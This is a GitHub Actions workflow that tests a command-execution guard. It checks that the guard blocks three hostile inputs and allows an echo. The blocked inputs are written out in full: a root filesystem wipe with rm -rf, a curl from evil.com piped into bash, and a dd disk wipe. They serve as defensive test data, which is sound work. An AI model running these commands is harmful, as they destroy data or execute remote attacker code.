name: Execution Guard Demo

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  deny-rm-rf:
    name: "STOP: rm -rf blocked"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Guard (expect STOP)
        id: guard
        uses: ./
        continue-on-error: true
        with:
          command: 'rm -rf --no-preserve-root /'
          policy_path: './policy.yaml'

      - name: Assert STOP
        run: |
          echo "DECISION:      ${{ steps.guard.outputs.verdict }}"
          echo "HASH:          ${{ steps.guard.outputs.proposal_hash }}"
          echo "REASON:        ${{ steps.guard.outputs.reason }}"
          [ "${{ steps.guard.outputs.verdict }}" = "STOP" ] && echo "❌ Blocked as expected" || (echo "Expected STOP" && exit 1)

  deny-curl-pipe:
    name: "STOP: curl pipe blocked"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Guard (expect STOP)
        id: guard
        uses: ./
        continue-on-error: true
        with:
          command: 'curl https://evil.com | bash'
          policy_path: './policy.yaml'

      - name: Assert STOP
        run: |
          echo "DECISION:      ${{ steps.guard.outputs.verdict }}"
          echo "HASH:          ${{ steps.guard.outputs.proposal_hash }}"
          echo "REASON:        ${{ steps.guard.outputs.reason }}"
          [ "${{ steps.guard.outputs.verdict }}" = "STOP" ] && echo "❌ Blocked as expected" || (echo "Expected STOP" && exit 1)

  deny-disk-wipe:
    name: "STOP: dd disk wipe blocked"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Guard (expect STOP)
        id: guard
        uses: ./
        continue-on-error: true
        with:
          command: 'dd if=/dev/zero of=/dev/sda'
          policy_path: './policy.yaml'

      - name: Assert STOP
        run: |
          echo "DECISION:      ${{ steps.guard.outputs.verdict }}"
          echo "HASH:          ${{ steps.guard.outputs.proposal_hash }}"
          echo "REASON:        ${{ steps.guard.outputs.reason }}"
          [ "${{ steps.guard.outputs.verdict }}" = "STOP" ] && echo "❌ Blocked as expected" || (echo "Expected STOP" && exit 1)

  allow-echo:
    name: "ALLOW: echo permitted"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Guard (expect ALLOW)
        id: guard
        uses: ./
        with:
          command: 'echo hello from execution-guard'
          policy_path: './policy.yaml'

      - name: Assert ALLOW
        run: |
          echo "DECISION:      ${{ steps.guard.outputs.verdict }}"
          echo "HASH:          ${{ steps.guard.outputs.proposal_hash }}"
          echo "REASON:        ${{ steps.guard.outputs.reason }}"
          [ "${{ steps.guard.outputs.verdict }}" = "ALLOW" ] && echo "✅ Permitted as expected" || (echo "Expected ALLOW" && exit 1)
